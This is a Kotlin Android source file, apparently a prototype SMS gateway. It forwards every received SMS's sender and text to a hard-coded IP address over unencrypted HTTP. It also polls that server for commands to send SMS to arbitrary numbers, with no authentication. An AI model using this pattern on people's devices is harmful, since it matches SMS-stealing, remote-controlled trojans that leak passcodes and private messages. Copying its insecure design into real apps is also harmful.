package com.example.smsmvp

import android.telephony.SmsManager
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

object Net {
    private val TAG = "Net"
    private val client = OkHttpClient()
    
    // Server URL for SMS automation
    private const val SERVER_URL = "http://95.217.125.133:8010"
    
    suspend fun sendSmsToServer(sender: String, body: String) {
        val json = JSONObject().apply {
            put("from", sender)
            put("body", body)
            put("timestamp", System.currentTimeMillis())
        }
        
        val requestBody = json.toString().toRequestBody("application/json".toMediaType())
        val url = "$SERVER_URL/sms/received"
        
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
        
        // Log the request
        HttpLogger.logRequest(url, "POST", json.toString())
        
        try {
            val response = client.newCall(request).execute()
            val responseBodyString = response.body?.string() ?: ""
            
            if (response.isSuccessful) {
                Log.d(TAG, "SMS sent to server successfully")
                HttpLogger.logResponse(url, response.code, responseBodyString)
            } else {
                Log.e(TAG, "Failed to send SMS to server: ${response.code}")
                HttpLogger.logResponse(url, response.code, responseBodyString, "HTTP ${response.code}")
            }
            response.close()
        } catch (e: IOException) {
            Log.e(TAG, "Network error sending SMS to server", e)
            HttpLogger.logResponse(url, 0, null, e.message)
            throw e
        }
    }
    
    suspend fun pollForCommands() {
        val url = "$SERVER_URL/commands/poll"
        val request = Request.Builder()
            .url(url)
            .get()
            .build()
        
        // Log the request
        HttpLogger.logRequest(url, "GET")
        
        try {
            val response = client.newCall(request).execute()
            val responseBodyString = response.body?.string() ?: ""
            
            if (response.isSuccessful) {
                HttpLogger.logResponse(url, response.code, responseBodyString)
                if (responseBodyString.isNotEmpty()) {
                    processCommands(responseBodyString)
                }
            } else {
                Log.e(TAG, "Failed to poll commands: ${response.code}")
                HttpLogger.logResponse(url, response.code, responseBodyString, "HTTP ${response.code}")
            }
            response.close()
        } catch (e: IOException) {
            Log.e(TAG, "Network error polling commands", e)
            HttpLogger.logResponse(url, 0, null, e.message)
            throw e
        }
    }
    
    private fun processCommands(jsonResponse: String) {
        try {
            val json = JSONObject(jsonResponse)
            val commands = json.optJSONArray("commands")
            
            commands?.let {
                for (i in 0 until it.length()) {
                    val command = it.getJSONObject(i)
                    val action = command.getString("action")
                    
                    when (action) {
                        "send_sms" -> {
                            val to = command.getString("to")
                            val message = command.getString("message")
                            sendSms(to, message)
                        }
                        else -> {
                            Log.w(TAG, "Unknown command action: $action")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing commands", e)
        }
    }
    
    private fun sendSms(phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            Log.d(TAG, "SMS sent to $phoneNumber: $message")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
        }
    }
}
